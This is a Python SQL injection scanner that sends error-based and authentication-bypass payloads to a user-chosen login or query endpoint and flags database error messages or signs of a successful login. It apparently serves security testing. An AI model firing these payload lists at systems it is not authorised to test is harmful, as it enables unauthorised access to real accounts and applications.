#!/usr/bin/env python3
"""
Ethical Exploration - SQL Injection (SQLi) Vulnerability Scanner
License: GNU General Public License v3.0 (GPL-3.0)
Description: Comprehensive scanner for Error-Based, Boolean-Based Blind, and Auth Bypass
             SQL injection vulnerabilities in web applications, forms, and query parameters.
"""

import argparse
import re
import sys
import time
import urllib.parse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.parse
    import urllib.error
    HAS_REQUESTS = False


# Known Database Error Signatures
SQL_ERROR_PATTERNS = {
    "MySQL / MariaDB": [
        r"you have an error in your sql syntax",
        r"warning: mysql_",
        r"valid mysql result",
        r"mySqlClient\.",
        r"com\.mysql\.jdbc\.exceptions"
    ],
    "PostgreSQL": [
        r"postgresql query failed",
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"unterminated quoted string at or near",
        r"psycopg2\.programmingerror"
    ],
    "Microsoft SQL Server": [
        r"driver\]\[sql server\]",
        r"unclosed quotation mark before the character string",
        r"syntax error in string in query expression",
        r"microsoft ole db provider for sql server"
    ],
    "Oracle": [
        r"ora-00933: sql command not properly ended",
        r"ora-01756: quoted string not properly terminated",
        r"oracle error",
        r"quoted string not properly terminated"
    ],
    "SQLite": [
        r"sqlite3::sqlexception",
        r"sqlite_error",
        r"near \".*\": syntax error",
        r"unrecognized token:"
    ],
    "Generic SQL": [
        r"syntax error in sql statement",
        r"dynamic sql error",
        r"sql command not properly ended",
        r"check the manual that corresponds to your"
    ]
}

# Payloads for testing
ERROR_PAYLOADS = [
    "'", "\"", "')", "\")", "';", "';--", "';#",
    "' OR '1'='1", "\" OR \"1\"=\"1",
    "1' ORDER BY 1--+", "1' UNION SELECT NULL--+"
]

AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1#",
    "admin' --", "admin' /*", "admin' or '1'='1",
    "' or 1=1 limit 1 --", "\" or 1=1 limit 1 --"
]


def send_probe(url, method="GET", data=None, headers=None, timeout=8):
    """Executes HTTP request and returns status and text."""
    req_headers = {"User-Agent": "Mozilla/5.0 (SecurityAudit; SQLiScanner/1.0)"}
    if headers:
        req_headers.update(headers)

    if HAS_REQUESTS:
        try:
            if method.upper() == "POST":
                resp = requests.post(url, data=data, headers=req_headers, timeout=timeout, allow_redirects=True)
            else:
                resp = requests.get(url, params=data, headers=req_headers, timeout=timeout, allow_redirects=True)
            return resp.status_code, resp.text, len(resp.content)
        except Exception as e:
            return None, str(e), 0
    else:
        try:
            if method.upper() == "POST":
                encoded = urllib.parse.urlencode(data or {}).encode("utf-8")
                req = urllib.request.Request(url, data=encoded, headers=req_headers, method="POST")
            else:
                sep = "&" if "?" in url else "?"
                full_url = f"{url}{sep}{urllib.parse.urlencode(data or {})}" if data else url
                req = urllib.request.Request(full_url, headers=req_headers, method="GET")

            with urllib.request.urlopen(req, timeout=timeout) as response:
                content = response.read().decode("utf-8", errors="ignore")
                return response.status, content, len(content)
        except urllib.error.HTTPError as e:
            content = e.read().decode("utf-8", errors="ignore")
            return e.code, content, len(content)
        except Exception as e:
            return None, str(e), 0


def detect_db_errors(response_text):
    """Matches response text against SQL error signatures."""
    if not response_text:
        return []
    matched = []
    for db_type, patterns in SQL_ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                matched.append((db_type, pattern))
                break
    return matched


def scan_sqli(url, method="POST", base_param="username", fixed_params=None, test_auth_bypass=True):
    """Executes SQL injection scan against specified endpoint and parameter."""
    if fixed_params is None:
        fixed_params = {"password": "password123"}

    print("=" * 65)
    print("  Ethical Exploration - SQL Injection (SQLi) Vulnerability Scanner")
    print("=" * 65)
    print(f"[*] Target URL        : {url}")
    print(f"[*] Method            : {method.upper()}")
    print(f"[*] Target Parameter  : {base_param}")
    print("-" * 65)

    # 1. Baseline Request
    base_data = {base_param: "baseline_safe_user_test"}
    base_data.update(fixed_params)
    base_status, base_body, base_len = send_probe(url, method, base_data)
    print(f"[*] Baseline Request  : HTTP {base_status} (Length: {base_len} B)")

    vulnerabilities = []

    # 2. Error-Based SQLi Probes
    print("\n[*] Testing for Error-Based SQL Injection...")
    for payload in ERROR_PAYLOADS:
        probe_data = {base_param: payload}
        probe_data.update(fixed_params)
        status, body, length = send_probe(url, method, probe_data)

        if status is not None:
            matches = detect_db_errors(body)
            if matches:
                for db_type, pat in matches:
                    vuln_info = {
                        "type": "Error-Based SQL Injection",
                        "database": db_type,
                        "payload": payload,
                        "evidence": pat,
                        "status": status
                    }
                    vulnerabilities.append(vuln_info)
                    print(f"[!] [VULNERABILITY] {db_type} Error Triggered! Payload: {payload}")
                    print(f"    Evidence: Match '{pat}' in response")
                    break

    # 3. Auth Bypass Probes
    if test_auth_bypass:
        print("\n[*] Testing for Authentication Bypass SQL Injection...")
        for payload in AUTH_BYPASS_PAYLOADS:
            probe_data = {base_param: payload}
            probe_data.update(fixed_params)
            status, body, length = send_probe(url, method, probe_data)

            if status is not None and body:
                body_lower = body.lower()
                # Check if payload bypasses auth (success markers or significant difference from baseline)
                success_indicators = ["dashboard", "welcome", "my account", "logout", "login successful", "admin panel"]
                if any(ind in body_lower for ind in success_indicators):
                    vuln_info = {
                        "type": "Auth Bypass SQL Injection",
                        "database": "Generic",
                        "payload": payload,
                        "evidence": "Authentication success keyword observed",
                        "status": status
                    }
                    vulnerabilities.append(vuln_info)
                    print(f"[+] [CRITICAL] Authentication Bypass with payload: {payload}")
                elif abs(length - base_len) > 200 and status == 200:
                    matches = detect_db_errors(body)
                    if not matches and "invalid" not in body_lower and "incorrect" not in body_lower:
                        print(f"[*] Potential anomaly detected with payload: {payload} (Length diff: {length - base_len} B)")

    print("\n" + "=" * 65)
    print("ASSESSMENT SUMMARY:")
    if vulnerabilities:
        print(f"[!] Found {len(vulnerabilities)} SQL Injection vulnerability indicators:")
        for v in vulnerabilities:
            print(f"    - Type: {v['type']} | DB: {v.get('database')} | Payload: {v['payload']}")
    else:
        print("[+] No SQL injection vulnerabilities identified on probed vectors.")
    print("=" * 65)

    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - SQL Injection Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 SQLInjectionScanner.py -u https://example.com/login -p username -m POST
  python3 SQLInjectionScanner.py -u https://example.com/items?id=1 -p id -m GET
"""
    )
    parser.add_argument("-u", "--url", default="https://example.com/login", help="Target login or search endpoint URL")
    parser.add_argument("-p", "--param", default="username", help="Parameter name to inject payloads into (default: username)")
    parser.add_argument("-m", "--method", default="POST", choices=["POST", "GET"], help="HTTP Method (default: POST)")
    parser.add_argument("--password-param", default="password", help="Secondary password field name for form logins")

    args = parser.parse_args()

    scan_sqli(
        url=args.url,
        method=args.method,
        base_param=args.param,
        fixed_params={args.password_param: "password123"}
    )


if __name__ == "__main__":
    main()
